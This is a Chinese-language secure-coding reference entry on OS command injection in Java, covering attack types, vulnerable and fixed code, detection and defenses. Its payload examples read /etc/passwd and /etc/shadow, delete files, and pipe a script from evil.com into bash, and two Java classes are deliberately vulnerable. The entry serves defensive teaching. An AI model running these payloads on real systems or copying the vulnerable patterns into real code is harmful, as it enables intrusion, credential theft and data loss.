---
id: COMMAND-INJECTION
name: 命令注入
severity: critical
owasp: "A05:2025"
cwe: ["CWE-78", "CWE-77"]
category: injection
frameworks: ["Runtime.exec()", ProcessBuilder]
last_updated: "2026-04-18"
doc_version: "1.0"
---

# 命令注入漏洞

> 最后更新：2026-04-18

## 概述

命令注入（Command Injection）是一种严重的代码注入攻击，攻击者通过在应用程序的输入中插入恶意操作系统命令，使服务端在宿主操作系统上执行非预期的命令。在 Java 应用中，`Runtime.exec()` 和 `ProcessBuilder` 是主要的攻击入口。

由于命令注入可以直接获得操作系统的 shell 访问权限，其危害性极高，可导致远程代码执行（RCE）、数据泄露、系统被完全控制。

## 风险等级

| 维度 | 评级 |
|------|------|
| OWASP Top 10 | A05:2025 - Injection |
| CWE | CWE-78 / CWE-77 |
| 严重程度 | 严重 |

## 攻击类型

### 1. 管道符注入

利用 shell 管道符 `|` 将攻击命令拼接在合法命令之后执行。

```
; cat /etc/passwd
| cat /etc/shadow
```

### 2. 命令分隔符注入

利用 `;`、`&&`、`||` 等 shell 命令分隔符注入额外命令。

```
127.0.0.1; whoami
127.0.0.1 && cat /etc/passwd
127.0.0.1 || id
```

### 3. 命令替换注入

利用反引号或 `$()` 语法进行命令替换，将命令执行结果嵌入原始命令。

```
$(curl https://evil.com/shell.sh | bash)
`rm -rf /tmp`
```

### 4. 换行符注入

利用换行符 `%0a` 在命令中插入新行，绕过基于行的命令过滤。

```
127.0.0.1%0aid
```

## Java场景

### [VULNERABLE] Runtime.exec() 拼接用户输入

```java
// [VULNERABLE] Runtime.exec() 直接拼接用户输入执行系统命令
import java.io.*;

public class CommandInjectionVulnerable {

    // [VULNERABLE] 此方法存在命令注入漏洞，原因：直接拼接用户输入到系统命令
    public String pingHost(String host) throws IOException {
        // 漏洞：用户输入直接拼接到 shell 命令中
        // 攻击者输入 "127.0.0.1; cat /etc/passwd" 即可执行任意命令
        Runtime runtime = Runtime.getRuntime();
        Process process = runtime.exec("ping -c 4 " + host);

        BufferedReader reader = new BufferedReader(
            new InputStreamReader(process.getInputStream()));
        StringBuilder output = new StringBuilder();
        String line;
        while ((line = reader.readLine()) != null) {
            output.append(line).append("\n");
        }
        return output.toString();
    }
}
```

### [VULNERABLE] ProcessBuilder 拼接用户输入

```java
// [VULNERABLE] ProcessBuilder 拼接整个命令字符串
import java.io.*;

public class ProcessBuilderVulnerable {

    // [VULNERABLE] 此方法存在命令注入漏洞，原因：将用户输入作为命令的一部分执行
    public String executeCommand(String operation, String target) throws IOException {
        // 漏洞：使用 /bin/sh -c 执行拼接的命令字符串
        // 即使 ProcessBuilder 本身参数分离，但 /bin/sh -c 仍会解析 shell 语法
        ProcessBuilder pb = new ProcessBuilder("/bin/sh", "-c",
            operation + " " + target);
        pb.redirectErrorStream(true);
        Process process = pb.start();

        BufferedReader reader = new BufferedReader(
            new InputStreamReader(process.getInputStream()));
        StringBuilder output = new StringBuilder();
        String line;
        while ((line = reader.readLine()) != null) {
            output.append(line).append("\n");
        }
        return output.toString();
    }
}
```

### [SECURE] 使用参数化 ProcessBuilder

```java
// [SECURE] 使用 ProcessBuilder 参数分离，避免 shell 解析
import java.io.*;
import java.util.*;

public class CommandInjectionSecure {

    // [SECURE] 修复了命令注入漏洞，修复方式：使用参数分离避免 shell 解析
    public String pingHost(String host) throws IOException {
        // 安全校验：只允许合法的 IP 地址或域名
        if (!host.matches("^[a-zA-Z0-9.\\-]{1,253}$")) {
            throw new IllegalArgumentException("Invalid host format");
        }

        // 安全：ProcessBuilder 参数分离，每个参数独立传递，不经过 shell 解析
        ProcessBuilder pb = new ProcessBuilder("ping", "-c", "4", host);
        pb.redirectErrorStream(true);
        Process process = pb.start();

        BufferedReader reader = new BufferedReader(
            new InputStreamReader(process.getInputStream()));
        StringBuilder output = new StringBuilder();
        String line;
        while ((line = reader.readLine()) != null) {
            output.append(line).append("\n");
        }
        return output.toString();
    }

    // [SECURE] 使用 Java API 替代系统命令
    public boolean isHostReachable(String host) throws IOException {
        if (!host.matches("^[a-zA-Z0-9.\\-]{1,253}$")) {
            throw new IllegalArgumentException("Invalid host format");
        }
        // 安全：完全避免调用系统命令，使用 Java 原生 API
        return InetAddress.getByName(host).isReachable(5000);
    }
}
```

## 检测方法

1. **静态分析**：使用 Semgrep、SonarQube 扫描 `Runtime.exec()`、`ProcessBuilder` 调用，检测是否拼接用户可控输入
2. **动态测试**：在输入字段中注入命令分隔符（如 `; id`、`| whoami`），观察响应中是否包含命令执行结果
3. **代码审计**：搜索代码中所有 `Runtime.getRuntime().exec()` 和 `new ProcessBuilder()` 调用，确认参数来源
4. **交互式测试**：使用 Burp Suite 修改请求参数，注入各种命令注入 payload

## 防护措施

1. **避免系统命令调用**：优先使用 Java 原生 API 替代系统命令（如用 `InetAddress.isReachable()` 替代 `ping`）
2. **参数化执行**：使用 `ProcessBuilder` 的参数分离模式，避免通过 `/bin/sh -c` 执行拼接字符串
3. **输入白名单校验**：严格校验用户输入格式，只允许预期的字符（如 IP 地址正则 `^[0-9.]+$`）
4. **最小权限**：以最低必要权限运行应用，使用安全沙箱限制命令执行范围
5. **命令白名单**：限制可执行的命令集合，禁止任意命令执行

## 参考资料

- [OWASP Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
- [CWE-78: OS Command Injection](https://cwe.mitre.org/data/definitions/78.html)
- [CWE-77: Improper Neutralization of Special Elements used in a Command](https://cwe.mitre.org/data/definitions/77.html)
- [Oracle: ProcessBuilder API](https://docs.oracle.com/en/java/javase/17/docs/api/java.base/java/lang/ProcessBuilder.html)
